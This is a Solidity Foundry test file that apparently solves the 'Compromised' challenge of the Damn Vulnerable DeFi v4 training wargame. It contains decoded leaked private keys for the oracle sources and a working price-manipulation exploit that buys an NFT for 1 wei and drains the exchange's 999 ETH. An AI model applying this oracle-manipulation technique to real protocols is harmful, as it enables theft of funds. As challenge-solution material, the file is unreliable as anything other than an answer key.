// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {ExchangeExploiter} from "../../src/compromised/ExchangeExploiter.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;


    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        // To get private key using NodeJS:
        // key1 = "4d486733..." <-- in hex
        // Buffer.from(key1, "hex").toString(): "MHg3ZD..." <-- in base64
        // Buffer.from("MHg3ZD...", "base64").toString(): "0x7d15bba..." <-- private key in hex
        uint256 trusted1_prv = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 trusted2_prv = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        address trusted1 = vm.addr(trusted1_prv);
        address trusted2 = vm.addr(trusted2_prv);

        require(trusted1 == sources[0] && trusted2 == sources[1], "Trusted reporters not decoded properly");

        // Manipulate the price to make the median price equal to 1 wei
        uint256 NEW_PRICE = 1;
        for (uint256 i = 0; i < sources.length - 1; ++i) {
            vm.prank(sources[i], sources[i]);
            oracle.postPrice("DVNFT", NEW_PRICE);
            vm.stopPrank();
        }

        // Buy with price = 1 wei
        vm.prank(player, player);
        ExchangeExploiter exploiter = new ExchangeExploiter(exchange, recovery);
        uint256 nftId = exploiter.buyOne{value: NEW_PRICE}();
        vm.stopPrank();

        // Set price such that selling NFT would take out all the ETH stored in the exchange
        for (uint256 i = 0; i < sources.length - 1; ++i) {
            vm.prank(sources[i], sources[i]);
            oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + NEW_PRICE);
            vm.stopPrank();
        }

        // Sell with the new manipulated price
        vm.prank(player, player);
        exploiter.sellOne(nftId, EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        // Restore the original price
        for (uint256 i = 0; i < sources.length - 1; ++i) {
            vm.prank(sources[i], sources[i]);
            oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
            vm.stopPrank();
        }
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
